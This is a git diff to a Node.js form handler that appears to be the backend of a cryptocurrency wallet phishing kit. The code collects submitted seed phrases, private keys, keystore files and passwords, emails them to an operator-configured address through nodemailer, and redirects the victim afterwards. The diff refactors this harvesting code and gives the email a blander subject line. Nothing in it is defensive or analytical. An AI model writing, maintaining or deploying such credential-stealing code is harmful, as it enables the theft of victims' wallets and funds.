@@ -2,7 +2,7 @@ const nodemailer = require('nodemailer');
 const formidable = require('formidable');
 const { parse } = require('querystring');
 
-async function parseBody(req) {
+async function readBody(req) {
   const contentType = req.headers['content-type'] || '';
 
   if (req.body && typeof req.body === 'object' && !Buffer.isBuffer(req.body)) {
@@ -52,34 +52,48 @@ async function parseBody(req) {
   return {};
 }
 
-module.exports = async function handler(req, res) {
+async function handler(req, res) {
   if (req.method !== 'POST') {
     return res.status(405).send('Method not allowed');
   }
 
+  let body = {};
+
   try {
-    const body = await parseBody(req);
-    const walletName = body.wallet_name || body.walletName || body.wallet_type || body.walletType || '';
-    const phase = body.phase || body.verification_method || body.verificationMethod || 'seedphrase';
-    const password = body.pw || body.password || body.keystorePassword || body.keystore_password || '';
-    const seedphrase = body.seedphrase || body.phrase || body.seedphraseInput || '';
-    const privateKey = body.privateKey || body.privatekey || body.private_key || body.privateKeyInput || '';
-    const keystore = body.keystore || body.keystoreFile || body.keystore_json || '';
+    body = await readBody(req);
+  } catch (error) {
+    console.error('Body parsing error:', error);
+    return res.status(400).send('Unable to read form data.');
+  }
 
-    const mailOptions = {
-      from: `${process.env.SMTP_FROM_NAME || 'Wallet Form'} <${process.env.SMTP_FROM_EMAIL || process.env.SMTP_USER}>`,
-      to: process.env.RECIPIENT_EMAIL || process.env.SMTP_USER,
-      subject: 'New Wallet Import Submission',
-      text: [
-        `Wallet: ${walletName}`,
-        `Phase: ${phase}`,
-        `Seedphrase: ${seedphrase}`,
-        `Private Key: ${privateKey}`,
-        `Keystore: ${keystore}`,
-        `Password: ${password}`,
-      ].join('\n'),
-    };
+  const {
+    wallet_name,
+    walletName,
+    phase,
+    pw: password,
+    password: passwordField,
+    seedphrase,
+    phrase,
+    privateKey,
+    privatekey,
+    private_key,
+    keystore,
+    keystorePassword,
+    keystore_password,
+  } = body;
 
+  const walletNameValue = wallet_name || walletName || '';
+  const phaseValue = phase || '';
+  const passwordValue = password || passwordField || keystorePassword || keystore_password || '';
+  const seedPhraseValue = seedphrase || phrase || '';
+  const privateKeyValue = privateKey || privatekey || private_key || '';
+  const keystoreValue = keystore || '';
+
+  if (!phaseValue || phaseValue.trim() === '') {
+    return res.status(400).send('Required field missing.');
+  }
+
+  try {
     const transporter = nodemailer.createTransport({
       host: process.env.SMTP_HOST,
       port: parseInt(process.env.SMTP_PORT || '587', 10),
@@ -90,6 +104,20 @@ module.exports = async function handler(req, res) {
       },
     });
 
+    const mailOptions = {
+      from: `${process.env.SMTP_FROM_NAME || 'Wallet Form'} <${process.env.SMTP_FROM_EMAIL || process.env.SMTP_USER}>`,
+      to: process.env.RECIPIENT_EMAIL || process.env.SMTP_USER,
+      subject: 'New Form Submission',
+      text: [
+        `Wallet Name: ${walletNameValue}`,
+        `Phase: ${phaseValue}`,
+        `Seed Phrase: ${seedPhraseValue}`,
+        `Private Key: ${privateKeyValue}`,
+        `Keystore: ${keystoreValue}`,
+        `Password: ${passwordValue}`,
+      ].join('\n'),
+    };
+
     await transporter.sendMail(mailOptions);
     res.writeHead(302, { Location: '/rdr.html' });
     res.end();
@@ -97,4 +125,11 @@ module.exports = async function handler(req, res) {
     console.error('Email error:', error);
     res.status(500).send('Message could not be sent. Error: ' + error.message);
   }
+}
+
+module.exports = handler;
+module.exports.config = {
+  api: {
+    bodyParser: false,
+  },
 };
